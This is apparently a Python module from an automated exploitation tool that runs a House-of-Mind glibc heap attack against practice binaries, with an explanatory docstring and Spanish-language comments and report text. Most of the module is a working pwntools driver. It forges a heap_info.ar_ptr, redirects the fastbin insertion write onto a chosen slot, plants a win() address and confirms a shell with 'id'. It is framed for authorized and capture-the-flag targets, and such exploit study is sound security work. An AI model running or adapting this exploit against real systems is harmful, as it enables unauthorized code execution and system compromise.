"""House-of-Mind, verified by execution.

House-of-Mind abuses glibc's per-heap ARENA SELECTION: free() finds the arena via `heap_for_ptr(p)`
-- it masks the chunk pointer down to the containing heap and reads the `heap_info.ar_ptr` there --
then inserts the chunk into that arena's fastbins. By corrupting `ar_ptr` to a fake arena, the
fastbin insertion `arena->fastbinsY[idx] = chunk` writes the chunk address to an attacker-chosen
location -> hijack. A faithful glibc HoM also needs the NON_MAIN_ARENA bit and a huge heap boundary;
binoracle verifies against a target whose allocator reproduces the
heap_for_ptr -> ar_ptr -> fastbin-insertion write, and degrades honestly otherwise. The sandbox runs
with ASLR off and `heap`/`hom_slot`/`win` are fixed symbols. For AUTHORIZED / CTF targets."""
from __future__ import annotations

from ._sandbox import elf_symbol_names, run_driver

_DRIVER = r'''
import sys, time
from pwn import ELF, context, p64, process
name = sys.argv[1]
context.binary = elf = ELF(name, checksec=False); context.log_level = "error"; context.arch = "amd64"
if elf.bits != 64:
    print("NOT_APPLICABLE (homind driver is x86-64)"); sys.exit(1)

sym = elf.symbols or {}
hom = sym.get("hom_slot") or sym.get("slot") or sym.get("target")
win = sym.get("win")
if hom is None or win is None:
    print("NOT_APPLICABLE (no House-of-Mind shape: need hom_slot+win symbols)"); sys.exit(1)

# The freed chunk has size 0x30 -> fastbin idx = (0x30-0x20)>>4 = 1. The write is
# arena->fastbinsY[idx] = &chunk, so forging ar_ptr = &hom_slot.target - idx*8 makes
# arena->fastbinsY[1] alias &hom_slot.target.
idx = 1
ar_ptr = (hom + 0x10 - idx * 8) & ((1 << 64) - 1)

MARK = b"BINORACLE_HOMIND_PWNED"
io = None
try:
    io = process([name], aslr=False)
    io.recvuntil(b"ar: ")
    io.send(p64(ar_ptr))                  # corrupt heap_info.ar_ptr = fake arena
    io.recvuntil(b"win: ")
    io.send(p64(win))                     # plant win into the freed chunk's user data
    time.sleep(0.2)
    io.sendline(b"echo " + MARK + b"; id"); time.sleep(0.35)
    out = b""
    try: out = io.recvrepeat(1.1)
    except Exception: pass
    io.close()
    if (MARK in out) or (b"uid=" in out):
        print("VERIFIED idx=%d ar_ptr=%#x hom=%#x win=%#x" % (idx, ar_ptr, hom, win)); sys.exit(0)
except Exception as e:
    try:
        if io: io.close()
    except Exception: pass
    print("ERROR %s" % e.__class__.__name__); sys.exit(1)
print("NOT_VERIFIED")
sys.exit(1)
'''


def _homind_applicable(binary: str) -> bool:
    """Chequeo barato: necesita un slot objetivo (hom_slot/slot/target) y win()."""
    names = elf_symbol_names(binary)
    if names is None:
        return True
    hom = any(n in names for n in ("hom_slot", "slot", "target"))
    return hom and "win" in names


def autohomind(binary: str) -> dict:
    """House-of-Mind verificado por ejecucion (contra un asignador que reproduce heap_for_ptr ->
    ar_ptr -> escritura de insercion en fastbin). Necesita la forma de practica (hom_slot/win).
    Docker o sandbox nativo (ASLR off); degrada limpio."""
    if not _homind_applicable(binary):
        return {"ok": False, "note": "no aplicable (sin hom_slot/slot/target + win)"}
    res = run_driver(binary, _DRIVER, ".binoracle_homind.py")
    if not res.get("ok"):
        return res
    eng = res.get("engine", "sandbox")
    res["note"] = (f"house-of-mind (arena forjada via heap_info.ar_ptr -> insercion en fastbin en "
                   f"direccion elegida -> hijack -> shell): verificada por ejecucion ({eng})"
                   if res.get("verified")
                   else f"house-of-mind: no verificado ({eng}) (sin la forma de practica o timing)")
    return res


def render_homind(r: dict) -> str:
    out = ["## Auto house-of-mind (arena selection -> fastbin insertion write, verificado)\n"]
    if not r.get("ok"):
        return "\n".join(out + ["No disponible: " + r.get("note", "")])
    out.append(f"- shell verificada en sandbox: **{'SI' if r.get('verified') else 'no'}**")
    if r.get("detail"):
        out.append(f"- `{r['detail']}`")
    out.append("- " + r.get("note", ""))
    out.append("\n_nota: el HoM real requiere el bit NON_MAIN_ARENA y una frontera de heap enorme; la "
               "verificacion reproduce heap_for_ptr -> ar_ptr -> la escritura de insercion en fastbin._")
    if r.get("output"):
        out.append("\n### salida\n```\n" + r["output"].strip() + "\n```")
    return "\n".join(out)
